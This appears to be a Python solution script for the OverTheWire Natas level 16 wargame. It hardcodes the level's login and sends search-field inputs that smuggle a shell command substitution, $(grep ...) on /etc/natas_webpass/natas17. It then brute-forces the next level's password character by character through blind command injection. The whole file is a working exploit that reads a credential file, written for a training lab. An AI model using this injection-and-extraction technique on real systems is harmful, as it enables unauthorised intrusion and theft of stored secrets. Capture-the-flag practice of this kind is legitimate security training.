#!/usr/local/bin/python3
import requests
import re
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

url = 'http://%s.natas.labs.overthewire.org/' % username

pas = ''

while (len(pas) < 32):
    for char in characters:
        print ('trying ' + pas + char)
        data = {"needle": 'zoos$(grep ^%s /etc/natas_webpass/natas17)' % (pas + char), "submit": "submit"}
        response = requests.post(url, data=data, auth=(username, password))
        content = response.text
        if "zoos" not in content:
            pas = pas + char
            break

print('password for natas17: ' + pas)
